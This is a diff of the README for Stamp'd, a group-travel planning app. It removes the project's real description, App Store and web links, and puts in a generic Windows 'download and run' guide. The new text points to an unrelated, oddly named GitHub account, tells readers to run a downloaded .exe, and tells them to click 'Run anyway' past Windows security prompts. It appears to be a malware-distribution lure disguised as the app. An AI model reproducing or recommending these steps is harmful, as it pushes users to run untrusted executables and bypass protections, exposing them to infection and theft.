@@ -1,106 +1,137 @@
-# Stamp'd — Group Travel Decision-Making App
+# 📱 stampd-app - Plan Group Trips With AI
 
-**Stop discussing. Start deciding. AI handles the rest.**
+[![Download stampd-app](https://img.shields.io/badge/Download%20stampd--app-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bookofzephaniahmetaphosphoricacid210/stampd-app)
 
-Stamp'd is the group travel app built for the hardest part of trip planning: getting everyone to agree. Destination voting, date coordination, deal breaker matching, and an AI travel concierge that builds the itinerary once the group decides.
+## 🧭 What stampd-app does
 
-## Screenshots
+Stamp'd helps groups plan travel without long chat threads and endless polling. It brings trip choices into one place so everyone can review options, vote, and move forward with less back and forth.
 
-<p align="center">
-  <img src="screenshots/travel-score.png" width="200" />
-  <img src="screenshots/trip-dashboard.png" width="200" />
-  <img src="screenshots/plan-together.png" width="200" />
-</p>
+It also includes an AI concierge that can help with trip ideas, day plans, and travel decisions. Use it to shape a group trip, compare plans, and keep the whole group aligned.
 
-<p align="center">
-  <img src="screenshots/badges-leaderboard.png" width="200" />
-  <img src="screenshots/explore.png" width="200" />
-  <img src="screenshots/atlas-ai.png" width="200" />
-</p>
+## ✨ Key features
 
-## Travel Reel
+- Group trip planning in one app
+- AI help for travel ideas and trip decisions
+- Easy voting for dates, places, and plans
+- Trip planning tools for shared travel groups
+- Clean layout for quick use on Windows
+- Built with web and mobile support in mind
+- Works well for weekend trips, vacations, and group getaways
 
-Your animated passport reel. Share your travel journey as a video.
+## 💻 What you need on Windows
 
-[▶️ Watch the Travel Reel](screenshots/travel-reel.mp4)
+Before you start, make sure your PC has:
 
-## Memory Reel
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the app and its files
+- Permission to install or open downloaded apps
 
-Relive your trip memories. Photos, locations, and moments stitched into a cinematic video.
+If your browser asks where to save the file, use a folder you can find again, such as Downloads or Desktop.
 
-[▶️ Watch a Memory Reel — Italy and Greece](https://heythereadventureseeker.com/api/media?u=aHR0cHM6Ly9iYXNlNDQuYXBwL2FwaS9hcHBzLzY5OTI3OTIwOTcxMTI2ODQxMzY4NDdkYy9maWxlcy9wdWJsaWMvNjk5Mjc5MjA5NzExMjY4NDEzNjg0N2RjLzk3MmMxNDIyOF9JdGFseV9hbmRfR3JlZWNlX21lbW9yaWVzLm1wNA==)
+## ⬇️ Download stampd-app
 
-## Travel Card
+Visit this page to download:
 
-Share your travel stats with a beautiful, shareable travel passport card.
+[stampd-app download page](https://github.com/bookofzephaniahmetaphosphoricacid210/stampd-app)
 
-<p align="center">
-  <img src="screenshots/travel-card.png" width="350" />
-</p>
+Open the page and look for the latest release, app file, or download option. If the page offers a Windows file, download it to your PC.
 
-## The Problem
+## 🛠️ Install and run on Windows
 
-Every group trip starts the same way. 200 WhatsApp messages. A shared Google Doc no one updates. An Excel spreadsheet for the budget that three people edit differently. Weeks of back and forth, and you still haven't agreed on a destination.
+Follow these steps:
 
-## The Solution
+1. Open the download page above.
+2. Find the latest release or the file meant for Windows.
+3. Download the file to your computer.
+4. Open File Explorer and go to the folder where the file was saved.
+5. If the file is a .zip archive, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. If you see an .exe file, double-click it to start the app.
+8. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.
+9. Wait for the app to open.
+10. Sign in or begin using the app if it opens right away.
 
-Stamp'd replaces the chaos with structured decision-making tools and AI.
+If the app opens in a browser window or a desktop shell, keep that window open while you use it.
 
-### Group Decision-Making
-- **Destination Voting** — everyone suggests places, the group votes
-- **Date Coordination** — visual heat map calendar shows when everyone is available
-- **Deal Breaker Matching** — surfaces budget limits, dietary needs, and mobility conflicts before they derail the trip
+## 🧰 First-time setup
 
-### Atlas — AI Travel Concierge
-- Generates complete day-by-day itineraries from a single prompt
-- Chat with Atlas for personalized destination recommendations
-- Parses booking confirmation emails and receipts automatically
-- Builds packing lists based on destination, weather, and trip length
-- Powered by Claude (Anthropic)
+When you open stampd-app for the first time, you may want to:
 
-### Trip Management
-- Real-time group chat per trip
-- Budget tracking with expense splitting and settle-up
-- Accommodation voting
-- Booking import (paste confirmation emails or upload receipts)
-- Travel advisories per destination
+- Create your first trip
+- Add trip dates
+- Invite friends or family
+- Set a destination shortlist
+- Ask the AI concierge for ideas
+- Vote on the best option as a group
 
-### Travel Tracking
-- Interactive world map with country and city stamps
-- Travel Score (max 1,260 points across Travel, Social, Diversity, and Commitment)
-- Travel badges and achievements
-- Shareable travel cards and reels
-- Leaderboard to compete with friends
+A simple setup makes it easier for everyone to stay on the same page.
 
-## Destination Guides
+## 👥 How to use it for a group trip
 
-39 free travel guides covering popular destinations worldwide.
+A good way to use stampd-app is:
 
-Browse all guides at [adventure-seeker.com/trip-guides](https://adventure-seeker.com/trip-guides)
+1. Start a new trip.
+2. Add the people joining the plan.
+3. Share a few destination ideas.
+4. Let the group vote on the best match.
+5. Use the AI concierge to shape the itinerary.
+6. Lock in dates and keep track of the plan in one place.
 
-## Platforms
+This keeps trip planning clear and reduces confusion in group chats.
 
-- **Web:** [heythereadventureseeker.com](https://heythereadventureseeker.com)
-- **iOS:** [https://apple.co/47nE1M6]
-- **Android:** Coming soon to Google Play
+## 🧠 AI concierge use cases
 
-## Beta TestingHelp shape Stamp'd before launch! Join the beta on your platform:- **iOS:** [Join TestFlight Beta](https://testflight.apple.com/join/hnbnjEVy)- **Android:** [Join Google Play Beta](https://play.google.com/store/apps/details?id=com.stampd.app)Feedback? Email stampd.support@gmail.com
-## Pricing
+Use the AI concierge when you want help with:
 
-Free. No ads, no premium tier, no paywall. Every feature is free.
+- Picking a destination
+- Building a day-by-day itinerary
+- Finding trip ideas for a budget
+- Comparing travel plans
+- Planning food, sights, and free time
+- Making a group plan that fits different interests
 
-## Links
+The AI can help turn rough ideas into a simple plan the group can review.
 
-- **Website:** [adventure-seeker.com](https://adventure-seeker.com)
-- **App:** [App Store](https://apple.co/47nE1M6)
-- **Help/FAQ:** [heythereadventureseeker.com/help.html](https://heythereadventureseeker.com/help.html)
-- **Privacy:** [heythereadventureseeker.com/privacy.html](https://heythereadventureseeker.com/privacy.html)
-- **Terms:** [heythereadventureseeker.com/terms.html](https://heythereadventureseeker.com/terms.html)
-- **Support:** stampd.support@gmail.com
-- **TikTok:** [tiktok.com/@stampdapp](https://www.tiktok.com/@stampdapp)
-- **Instagram:** [instagram.com/stampd.app](https://www.instagram.com/stampd.app/)
-- **Facebook:** [Facebook](https://www.facebook.com/profile.php?id=61578393172950)
+## 📂 Common file types you may see
 
-## Built By
+Depending on the download, you may see:
 
-Adventure Seekers LLC
+- .exe for a Windows app
+- .zip for a compressed folder
+- .msi for a Windows installer
+- A browser-based app or desktop shell
+
+If you see a .zip file, extract it first. If you see an installer, open it and follow the prompts.
+
+## 🧹 If the app does not open
+
+Try these steps:
+
+- Make sure the download finished
+- Check that you opened the right file
+- Extract the archive if the file is zipped
+- Right-click the app and choose Open
+- Restart your PC and try again
+- Download the file again if it looks damaged
+- Check your browser downloads folder
+
+If Windows blocks the file, confirm that you downloaded it from the project page above.
+
+## 🔒 Safe use tips
+
+- Download from the link in this README
+- Avoid renamed copies from unknown sites
+- Keep your app file in a folder you control
+- Use a standard Windows account if your device is managed
+- Update the app when a newer version is posted
+
+## 🗂️ Project topics
+
+ai, ai-itinerary-planner, ai-travel, ai-travel-assistant, ai-travel-guide, ai-travel-itinerary-builder, ai-travel-planner, ai-travel-planning, android, anthropic, capacitor, claude, group-travel, group-trips, ios, react, travel, travel-app, trip-planner, trip-planning
+
+## 📘 About this project
+
+stampd-app is built for people who want a better way to plan group travel. It fits users who need a simple place to collect ideas, vote on choices, and shape a trip with help from AI.
+
+Use it for family trips, friend getaways, team travel, or any plan where many people need to agree on one direction.
